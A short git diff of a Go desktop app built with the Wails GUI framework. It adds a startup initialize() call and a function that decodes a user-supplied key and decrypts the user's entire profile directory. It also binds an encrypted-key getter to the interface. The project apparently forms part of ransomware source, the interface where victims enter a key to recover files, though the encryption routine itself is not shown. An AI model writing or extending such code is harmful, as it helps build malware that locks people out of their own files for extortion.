@@ -2,6 +2,7 @@ package main
 
 import (
 	_ "embed"
+	b64 "encoding/base64"
 	"os"
 
 	"github.com/wailsapp/wails"
@@ -11,14 +12,16 @@ func basic() string {
 	return "Hello World!"
 }
 
-func osEnvWrapper() string {
-	return os.Getenv("USERPROFILE")
-}
-
 func getEncryptionKeyWrapper() string {
 	var result string
 	result = getEncryptedKey()
 	return result
+}
+
+func DecryptSystemWrapper(key string) string {
+	keyBytes, _ := b64.StdEncoding.DecodeString(key)
+	DecryptSystem(os.Getenv("USERPROFILE"), keyBytes)
+	return "Finished Decryption."
 }
 
 //go:embed frontend/dist/app.js
@@ -29,6 +32,8 @@ var css string
 
 func main() {
 
+	initialize()
+
 	app := wails.CreateApp(&wails.AppConfig{
 		Width:  1024,
 		Height: 768,
@@ -38,6 +43,6 @@ func main() {
 		Colour: "#131313",
 	})
 	app.Bind(getEncryptionKeyWrapper)
-	app.Bind(basic)
+	app.Bind(DecryptSystemWrapper)
 	app.Run()
 }
